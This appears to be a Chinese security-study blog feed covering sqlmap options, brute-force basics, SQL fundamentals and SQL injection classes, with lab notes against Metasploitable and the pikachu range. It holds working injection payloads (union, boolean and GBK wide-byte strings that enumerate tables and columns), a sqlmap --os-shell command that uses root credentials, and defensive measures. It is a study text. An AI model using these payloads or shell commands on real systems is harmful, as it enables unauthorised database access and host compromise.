&lt;p&gt;sqlmap -d &amp;quot;mysql:&#x2F;&#x2F;root:root@192.168.10.130:3306&#x2F;mysql&amp;quot; --os-shell   #知道网站的账号密码直接连接&lt;&#x2F;p&gt;
&lt;p&gt;-v3                   #输出详细度  最大值5 会显示请求包和回复包&lt;br &#x2F;&gt;--threads 5           #指定线程数&lt;br &#x2F;&gt;--fresh-queries       #清除缓存&lt;br &#x2F;&gt;--flush-session       #清空会话，重构注入&lt;br &#x2F;&gt;--batch               #对所有的交互式的都是默认的&lt;br &#x2F;&gt;--random-agent        #任意的http头&lt;br &#x2F;&gt;--tamper base64encode            #对提交的数据进行base64编码&lt;br &#x2F;&gt;--referer http:&#x2F;&#x2F;www.baidu.com   #伪造referer字段&lt;&#x2F;p&gt;
&lt;p&gt;--keep-alive     保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 保错的时候，使用这个参数&lt;&#x2F;p&gt;
&lt;h1 id=&quot;sqlzhu-ru-fang-yu-shou-duan&quot;&gt;SQL注入防御手段&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;dai-ma-ceng&quot;&gt;代码层&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;黑名单&lt;&#x2F;li&gt;
&lt;li&gt;白名单&lt;&#x2F;li&gt;
&lt;li&gt;敏感字符过滤&lt;&#x2F;li&gt;
&lt;li&gt;使用框架安全查询&lt;&#x2F;li&gt;
&lt;li&gt;规范输出&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;pei-zhi-ceng&quot;&gt;配置层&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;开启GPC&lt;&#x2F;li&gt;
&lt;li&gt;使用UTF-8&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;wu-li-ceng&quot;&gt;物理层&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;WAF&lt;&#x2F;li&gt;
&lt;li&gt;数据库审计&lt;&#x2F;li&gt;
&lt;li&gt;云防护&lt;&#x2F;li&gt;
&lt;li&gt;IPS（入侵防御系统）&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>漏洞</title>
		<published>2020-09-16T00:00:00+00:00</published>
		<updated>2020-09-16T00:00:00+00:00</updated>
		<link href="https://baz.ee/lou-dong/" type="text/html"/>
		<id>https://baz.ee/lou-dong/</id>
		<content type="html">&lt;h1 id=&quot;bao-li-po-jie&quot;&gt;暴力破解&lt;&#x2F;h1&gt;
&lt;h3 id=&quot;shi-yan-huan-jing&quot;&gt;实验环境&lt;&#x2F;h3&gt;
&lt;p&gt;攻击环境：kali、win(burp)&lt;&#x2F;p&gt;
&lt;p&gt;靶机环境：metaspoloitable2-linux&lt;&#x2F;p&gt;
&lt;h3 id=&quot;lou-dong-yuan-li&quot;&gt;漏洞原理&lt;&#x2F;h3&gt;
&lt;p&gt;理论上暴力破解能够破解任何一种密码&lt;&#x2F;p&gt;
&lt;p&gt;暴力破解前提条件：服务器没有对输入的参数内容、次数进行限制(基于IP限制、基于账号限制)&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;破解成功的影响因素：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;算力&lt;&#x2F;li&gt;
&lt;li&gt;字典精准率&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;gong-ji-chang-jing&quot;&gt;攻击场景&lt;&#x2F;h3&gt;
&lt;p&gt;B&#x2F;S架构暴力破解包含如下分类：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;登录框（用户名和密码）&lt;&#x2F;li&gt;
&lt;li&gt;URL参数（用户ID值、目录名、参数名等）&lt;&#x2F;li&gt;
&lt;li&gt;验证码（验证码接收处）&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;C&#x2F;S加厚暴力破解包含如下分类：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;Windows远程桌面rdp&lt;&#x2F;li&gt;
&lt;li&gt;SSH远程登录&lt;&#x2F;li&gt;
&lt;li&gt;数据库账号密码（MySQL、MongoDB、Oracle）&lt;&#x2F;li&gt;
&lt;li&gt;FTP账号密码等&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;lou-dong-wei-hai&quot;&gt;漏洞危害&lt;&#x2F;h3&gt;
&lt;p&gt;枚举账号密码&lt;&#x2F;p&gt;
&lt;p&gt;枚举敏感目录、文件&lt;&#x2F;p&gt;
&lt;p&gt;枚举敏感数据&lt;&#x2F;p&gt;
&lt;h3 id=&quot;jian-ce-fang-fa&quot;&gt;检测方法&lt;&#x2F;h3&gt;
&lt;p&gt;手工检测&lt;&#x2F;p&gt;
&lt;p&gt;attack type:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;sniper 针对单个参数进行测试&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Battering ram&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;payload type:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;simple list&lt;&#x2F;li&gt;
&lt;li&gt;runtime file&lt;&#x2F;li&gt;
&lt;li&gt;custom iterater&lt;&#x2F;li&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;li&gt;number&lt;&#x2F;li&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;li&gt;null payload&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;fang-yu-fang-an&quot;&gt;防御方案&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;要求用户使用复杂的强密码，避免使用任何已知的弱口令，强制密码设置为：至少三种字符，长度大于16或18位；&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;每次登陆时，均要求使用验证码（要注意验证码的健壮性）&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;对登陆行为进行判断和限制，当尝试次数达到限制时，锁定账户或者IP地址&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;禁止密码输入频率过高的请求&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;采用双因素认证（多因素认证）&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;【问】常见的双因素认证方式有哪些？&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;【问】双因素认证的三要素是什么？&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;使用者所知道的内容：身份证或密码等&lt;&#x2F;li&gt;
&lt;li&gt;使用者所拥有的物品：IC卡、U盾、动态密码卡等&lt;&#x2F;li&gt;
&lt;li&gt;使用者所具备的特征：指纹、声音、瞳孔等&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;​       这三个要素单独来看都会有一点风险，比如知道的内容可能会被猜出、被分享、被遗忘；所拥有的的物品可能被盗走；所具备的特征本身易受到攻击。将其中两个结合起来进行认证的方式，就被称为双因素认证。
​       当同一来源的密码输入出错次数超过一定阈值时，立即通过邮箱或短信的方式通知系统管理员。
​       配置详细的网络访问控制，严格限制将高危端口开放到互联网；对于关键资产，建议使用 vpn 和堡垒机的方式进行集中管理和审计。
​       提高全员安全意识，禁止借用和共享账号，禁止明文存储密码或公开密码规则。&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;rao-guo-fang-an&quot;&gt;绕过方案&lt;&#x2F;h3&gt;
&lt;h3 id=&quot;shi-zhan-an-li&quot;&gt;实战案例&lt;&#x2F;h3&gt;
&lt;h3 id=&quot;can-kao-zi-liao&quot;&gt;参考资料&lt;&#x2F;h3&gt;
&lt;h1 id=&quot;sqlzhu-ru&quot;&gt;SQL注入&lt;&#x2F;h1&gt;
&lt;p&gt;几乎所有的数据源都可能存在注入漏洞。&lt;&#x2F;p&gt;
&lt;p&gt;当攻击者将恶意代码发送到解释器时就 可能存在注入漏洞&lt;&#x2F;p&gt;
&lt;p&gt;1998年《Phrack》54期，rtf的黑客发表的“NT Web Technology Vulnerabilities”&lt;&#x2F;p&gt;
&lt;p&gt;SQL注入产生的原因：黑客通过构造包含恶意sql语句的&lt;em&gt;输入&lt;&#x2F;em&gt;，而Web应用未对用户输入进行&lt;em&gt;合法性校验&lt;&#x2F;em&gt;（数据长度、数据类型、数据内容（比如政治敏感）），使得这些恶意代码被数据库&lt;em&gt;正确执行&lt;&#x2F;em&gt;所导致。&lt;&#x2F;p&gt;
&lt;p&gt;基于技术原理分析原理通常是因为：不当的类型处理（比如手机号中可以输入非法字符）、不安全的数据库配置、不合理的查询集处理、不当的错误处理、转义字符处理不当、字符编码处理不当等。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;http:&#x2F;&#x2F;lonelyor-images.nevermore.pub&#x2F;images&#x2F;20200815101053.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;http:&#x2F;&#x2F;lonelyor-images.nevermore.pub&#x2F;images&#x2F;20200815102600.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;产生SQL注入攻击的两个必要条件：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;用户能够控制数据的输入&lt;&#x2F;li&gt;
&lt;li&gt;用户输入的数据被当做代码执行&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;SQL语言能做什么，SQL注入漏洞就能做什么&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;http:&#x2F;&#x2F;lonelyor-images.nevermore.pub&#x2F;images&#x2F;20200817145033.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;什么是数据库？&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;http:&#x2F;&#x2F;lonelyor-images.nevermore.pub&#x2F;images&#x2F;ea04737e-b7cd-417e-914a-cf28867fbe72.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;表头(header): 每一列的名称;&lt;&#x2F;p&gt;
&lt;p&gt;列(col): 具有相同数据类型的数据的集合;&lt;&#x2F;p&gt;
&lt;p&gt;行(row): 每一行用来描述某个人&#x2F;物的具体信息;&lt;&#x2F;p&gt;
&lt;p&gt;值(value): 行的具体信息, 每个值必须与该列的数据类型相同;&lt;&#x2F;p&gt;
&lt;p&gt;键(key): 表中用来识别某个特定的人\物的方法, 键的值在当前列中具有唯一性。&lt;&#x2F;p&gt;
&lt;p&gt;DBMS：数据库管理系统（Data Base Management System），是一种操作和管理数据库的大型软件，用来建立、使用和维护数据库&lt;&#x2F;p&gt;
&lt;p&gt;什么是SQL语言？&lt;&#x2F;p&gt;
&lt;p&gt;SQL 是用于访问和处理数据库的标准的计算机语言。 全称：结构化查询语言（Structured Query Language）
sql 包含 6 个部分：
1、数据查询语言（DQL:Data Query Language）：从数据表中获取数据。常用的关键字有 SELECT，WHERE，ORDER BY，GROUP BY 和 HAVING。
2、数据操作语言（DML：Data Manipulation Language）：对数据表中的数据进行操作。常用的关键字有 INSERT、UPDATE 和 DELETE。
3、数据定义语言（DDL）：其语句包括动词 CREATE、,ALTER 和 DROP。在数据库中创建新表或修改、删除表（CREAT TABLE 或 DROP TABLE）；为表加入索引等。
4、事务控制语言（TCL）：它的语句能确保被 DML 语句影响的表的所有行及时得以更新。包括 COMMIT（提交）命令、SAVEPOINT（保存点）命令、ROLLBACK（回滚）命令。
5、数据控制语言（DCL）：它的语句通过 GRANT 或 REVOKE 实现权限控制，确定单个用户和用户组对数据库对象的访问。某些 RDBMS 可用 GRANT 或 REVOKE 控制对表单个列的访问。
6、指针控制语言（CCL）：它的语句，像 DECLARE CURSOR，FETCH INTO 和 UPDATE WHERE CURRENT 用于对一个或多个表单独行的操作。
最常使用的 sql 语句是增删改查。
数据库大致可分为两种：关系型数据库和非关系型数据库。&lt;&#x2F;p&gt;
&lt;p&gt;关系数据库管理系统（Relational Database Management System：RDBMS）是指包括相互联系的逻辑组织和存取这些数据的一套程序 (数据库管理系统软件)。 常见的关系型数据库管理系统：Oracle、SQL Server、MySQL、Access、PostgreSQL、SQLite、DB2、vfp、Sybase 等。
概念：
存储方式：数据库中以表的存储方式，数据以行列的方式的存储。
存储结构：创建表时定义字段（列），之后再根据表结构存储数据（行）。
优点：
格式统一：都使用表的结构。
标准化：使用 SQL 语句对数据库进行查询，可以支持复杂操作（多表查询等）。
缺点：
表结构固定，灵活性欠缺。
高并发时读写性能低。
数据库的可扩展性和可用性低。&lt;&#x2F;p&gt;
&lt;p&gt;非关系数据库（Not Only SQL：NoSQL）泛指非关系型的数据库。严格意义上讲非关系型数据库是一种区别于关系型数据库的数据结构化存储方法的集合，可以是键值对存储、列存储、文档存储、还可以是图形存储。 常见的非关系型数据库：NoSQL、Redis、HBase、MongodDB、Neo4j 等。
概念：
存储方式：键值对（key&#x2F;value）、列存储、文档、图形四大分类。
存储结构：结构不固定。
优点：
速度快，可以使用硬盘或者内存卡做载体，所以快，较关系型只能使用硬盘。
高扩展性。
格式灵活，可以是 key&#x2F;value 形式、图形、文档、列等很灵活。
成本低，部署简单。
缺点：
不提供 SQL 支持，学习和使用成本较高。
存储简单数据。
数据结构相对复杂，复杂查询方面稍欠。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;http:&#x2F;&#x2F;lonelyor-images.nevermore.pub&#x2F;images&#x2F;c0163127d36240118f1a6875116a676a.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;http:&#x2F;&#x2F;lonelyor-images.nevermore.pub&#x2F;images&#x2F;28e80236d8994635b431524341a89c3c.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;http:&#x2F;&#x2F;lonelyor-images.nevermore.pub&#x2F;images&#x2F;a8e2b64008944320a5b7124d07e04a82.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;select *（字段） from 表名&lt;&#x2F;p&gt;
&lt;p&gt;select *（字段） from 表名 where 列名;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;http:&#x2F;&#x2F;lonelyor-images.nevermore.pub&#x2F;images&#x2F;4416672af59742cc9e777db633150d26.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;select *（字段） from 表名 where 列名 like &amp;quot;关键词&amp;quot;;&lt;&#x2F;p&gt;
&lt;p&gt;Mysql的通配符是 %&lt;&#x2F;p&gt;
&lt;p&gt;create user &#x27;test&#x27; identified by &#x27;123456&#x27;;
创建一个用户名为test 密码为123456的用户&lt;&#x2F;p&gt;
&lt;p&gt;为用户授权：
grant all privileges on persons.* to test@localhost identified by &#x27;123456&#x27;;
授权test用户拥有persons数据库的所有权限 可以指定数据库
grant all privileges on &lt;em&gt;.&lt;&#x2F;em&gt; to test@localhost identified by &#x27;123456&#x27;;
授权test用户拥有所有数据库的所有权限
在进行完以上操作后要刷新权限
flush privileges;&lt;&#x2F;p&gt;
&lt;p&gt;删除用户：
drop user test@&#x27;%&#x27;;&lt;&#x2F;p&gt;
&lt;p&gt;修改用户密码：
这里有两种一种使用 alter 一种使用 update：
alter user test@&#x27;%&#x27; identified by &#x27;123456&#x27;;   修改test用户密码为123456
或者
update mysql.user set authentication_string=password(&amp;quot;123456&amp;quot;) where User=&amp;quot;test&amp;quot; and Host=&amp;quot;%&amp;quot;;
flush privileges;&lt;&#x2F;p&gt;
&lt;p&gt;select @@version_compile_os;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;http:&#x2F;&#x2F;lonelyor-images.nevermore.pub&#x2F;images&#x2F;6b71ee36-8236-4f8e-a161-f346dc91e8d7.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;http:&#x2F;&#x2F;lonelyor-images.nevermore.pub&#x2F;images&#x2F;39da7705-1018-4565-a5ab-293e5c283b7d.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;http:&#x2F;&#x2F;lonelyor-images.nevermore.pub&#x2F;images&#x2F;07d59e5e-e487-4ca0-8fbd-ebfaee8d2e7a.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;http:&#x2F;&#x2F;lonelyor-images.nevermore.pub&#x2F;images&#x2F;09667e4f-5f10-43c8-9a99-2acef3eb9991.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E6%BC%8F%E6%B4%9E&#x2F;f0414f4cf35f767a1ce9067b7b2ed96.png&quot; alt=&quot;f0414f4cf35f767a1ce9067b7b2ed96&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;数据类型：字符型(char)、数值型(int)、浮点型(float)、日期和时间类型。&lt;&#x2F;p&gt;
&lt;p&gt;从表 Persons 中选出 Year 字段大于 1965 的数据
SELECT * FROM Persons WHERE Year&amp;gt;1965&lt;&#x2F;p&gt;
&lt;p&gt;SELECT * FROM Persons WHERE FirstName=&#x27;Thomas&#x27; AND LastName=&#x27;Carter&#x27;;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;ORDER BY&lt;&#x2F;code&gt; - 语句用于根据指定的列对结果集进行排序。 &lt;&#x2F;p&gt;
&lt;p&gt;UNION - 操作符用于合并两个或多个 SELECT 语句的结果集。&lt;&#x2F;p&gt;
&lt;p&gt;SELECT COUNT(1) AS totals FROM Persons;&lt;&#x2F;p&gt;
&lt;p&gt;database()&lt;&#x2F;p&gt;
&lt;p&gt;select database();&lt;&#x2F;p&gt;
&lt;p&gt;mid()    这个函数作用是从指定字段中提取出字段的内容。column_name：字段名 start：开始位置 length:长度&lt;&#x2F;p&gt;
&lt;p&gt;limit()	返回结果中的前几条数据或者中间的数据。SELECT * FROM TABLE LIMIT M,N;m是指记录开始的index，从0开始，表示第一条记录。n是指从第m+1条开始，取n条。&lt;&#x2F;p&gt;
&lt;p&gt;group by 根据想要的规则对结果进行分组。&lt;&#x2F;p&gt;
&lt;p&gt;substr() 截取字符串 substr(a,b,c) a 所要截取字符串 b 截取的位置 c 截取的长度 这个函数很常用，有三个参数，按顺序分别是字符串，起始位置和长度。可以求指定字符串的子串。当然，第一个参数可以是列的名字。这个函数似乎和mid没有什么不同，如果mid或者substr中的某一个函数被禁了就用另一个。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;http:&#x2F;&#x2F;lonelyor-images.nevermore.pub&#x2F;images&#x2F;aaaa4f45b6ab43e992f64425e7149c7c.jpg&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;ORD() 函数返回字符串第一个字符的 ASCII 值。&lt;&#x2F;p&gt;
&lt;p&gt;select ord(mid(database(),1,1))&amp;gt;110;&lt;&#x2F;p&gt;
&lt;p&gt;select ord(mid(database(),2,1))&amp;gt;111;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;lou-dong-yuan-li-1&quot;&gt;漏洞原理&lt;&#x2F;h3&gt;
&lt;h5 id=&quot;sqlzhu-ru-fen-lei&quot;&gt;sql注入分类&lt;&#x2F;h5&gt;
&lt;p&gt;根据数据类型分类：&lt;&#x2F;p&gt;
&lt;p&gt;数字型&lt;&#x2F;p&gt;
&lt;p&gt;select * from tables where id=1;&lt;&#x2F;p&gt;
&lt;p&gt;注入点：id=&lt;&#x2F;p&gt;
&lt;p&gt;id=1&lt;&#x2F;p&gt;
&lt;p&gt;id=1&#x27;&lt;&#x2F;p&gt;
&lt;p&gt;sql语句中，由两个部分组成，代码和数据&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;select * from tables where id=1&#x27;;&lt;&#x2F;code&gt; 报错&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;select * from tables where id=1&#x27; and 1=1;&lt;&#x2F;code&gt; 报错&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;select * from tables where id=1&#x27; and 1=1 --;&lt;&#x2F;code&gt; 报错&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;select * from tables where id=1&#x27; and 1=1 #&lt;&#x2F;code&gt; 有回显，有数据&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;select * from tables where id=1&#x27; and 1=3 #&lt;&#x2F;code&gt; 有回显，无数据&lt;&#x2F;p&gt;
&lt;p&gt;注意点：数字型sql注入通常出现在弱类型语言中，强类型语言较少。&lt;&#x2F;p&gt;
&lt;p&gt;字符型：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;select * from tables where id=1&#x27;;&lt;&#x2F;code&gt; 报错&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;select * from tables where id=1&#x27; and &#x27;a&#x27;=&#x27;a&#x27; #;&lt;&#x2F;code&gt; 有回显，有数据&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;select * from tables where id=1&#x27; and &#x27;a&#x27;=&#x27;b&#x27; #;&lt;&#x2F;code&gt; 无回显，有数据&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;select * from tables where id=1 and &#x27;1&#x27;=&#x27;1 #;&lt;&#x2F;code&gt; 报错&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;select * from tables where id=1&#x27; and &#x27;1&#x27;=&#x27;1 #;&lt;&#x2F;code&gt; 有回显，无数据&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;select * from tables where id=1&#x27; and &#x27;1&#x27;=&#x27;1;&lt;&#x2F;code&gt; 有回显，有数据&lt;&#x2F;p&gt;
&lt;p&gt;常见mysql注释符：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;#&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;--&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;*...*&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;基于效果进行分类：&lt;&#x2F;p&gt;
&lt;p&gt;联合注入&lt;&#x2F;p&gt;
&lt;p&gt;union 用于合并两个或多个 select 语句的结果&lt;&#x2F;p&gt;
&lt;p&gt;select colums_name from tables_name union select x,y,z #&lt;&#x2F;p&gt;
&lt;p&gt;这里x,y,z的数量必须跟colums的数量是一样的，否则会报错&lt;&#x2F;p&gt;
&lt;p&gt;基于“union查询需要保证列数一致”这个查询逻辑，若不一致的话，则出现如下信息:
The used SELECT statements have a different number of colums&lt;&#x2F;p&gt;
&lt;p&gt;根据这个点，可以不断设置后面的x,y,z参数，基于报错，猜测数据列&lt;&#x2F;p&gt;
&lt;p&gt;where user_id = &#x27;&#x27; union select 1,2 –&#x27;&#x27;;&lt;&#x2F;p&gt;
&lt;p&gt;布尔注入&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;select first_name,last_name from users where user_id = &#x27;&#x27; or 1=1 --&#x27;&#x27;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;1&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #
information_schema.tables
整个数据库中所有库和所对应的表信息 &lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;1&#x27; and (select count(column_name) from information_schema.columns where table_name= 0x7573657273)=8 #&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;显错注入&lt;&#x2F;p&gt;
&lt;p&gt;&#x27; 报错，可能是注入点&lt;&#x2F;p&gt;
&lt;p&gt;延时注入&lt;&#x2F;p&gt;
&lt;p&gt;sleep&lt;&#x2F;p&gt;
&lt;p&gt;宽字节注入&lt;&#x2F;p&gt;
&lt;p&gt;搭建pikachu靶场&lt;&#x2F;p&gt;
&lt;p&gt;sudo docker build -t &amp;quot;pikachu&amp;quot; .&lt;&#x2F;p&gt;
&lt;p&gt;sudo docker run -d -p8915:80 pikachu&lt;&#x2F;p&gt;
&lt;p&gt;原理：&lt;&#x2F;p&gt;
&lt;p&gt;UTF-8&lt;&#x2F;p&gt;
&lt;p&gt;GBK&lt;&#x2F;p&gt;
&lt;p&gt;宽字节注入满足的条件：&lt;&#x2F;p&gt;
&lt;p&gt;1、数据库编码被设置为GBK&lt;&#x2F;p&gt;
&lt;p&gt;2、使用了转义函数，将get、post、cookie传递的参数进行过滤，一般用来过滤单引号、双引号、null等敏感字符（\）&lt;&#x2F;p&gt;
&lt;p&gt;常见的函数是：addslashes()、mysql_real_escape_string()&lt;&#x2F;p&gt;
&lt;p&gt;url编码&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;空格 %20&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; %27&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;# %23&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;\ %5C&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;payload：&lt;code&gt;&#x27;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;因为有转义函数，所以就变成了&lt;code&gt;\&#x27;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;payload改为：&lt;code&gt;%df&#x27;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;转义后 &lt;code&gt;%df\&#x27;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;因此，url编码后payload为：&lt;&#x2F;p&gt;
&lt;p&gt;%df%5c%27&lt;&#x2F;p&gt;
&lt;p&gt;当mysql使用gbk编码时，会认为 %df%5c 是一个&lt;strong&gt;宽字符&lt;&#x2F;strong&gt;，payload 就变成了縗&#x27;&lt;&#x2F;p&gt;
&lt;p&gt;判断是否存在注入，和可显示的字段数&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;1%df&#x27; union select 1,2#&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;1%df&#x27;%20union%20select%201,2#&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;得出数据库名&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;1%df&#x27;%20union%20select%201,database()#&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;pikachu&lt;&#x2F;p&gt;
&lt;p&gt;得出表名&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;1%df&#x27;%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()#&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;1%df&#x27;%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()#&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;1%df&#x27;%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()#&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;1%df&#x27;%20union select group_concat(column_name),2 from information_schema.columns where table_name=“users” #&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;limit((select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),3,1)&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;1%df&amp;#39;%20union%20select%20group_concat(column_name),2%20from%20information_schema.columns%20where%20table_name=limit((select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),3,1)#&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;1%df&amp;#39;%20union%20select (select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database())limit 3,1)),2#&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
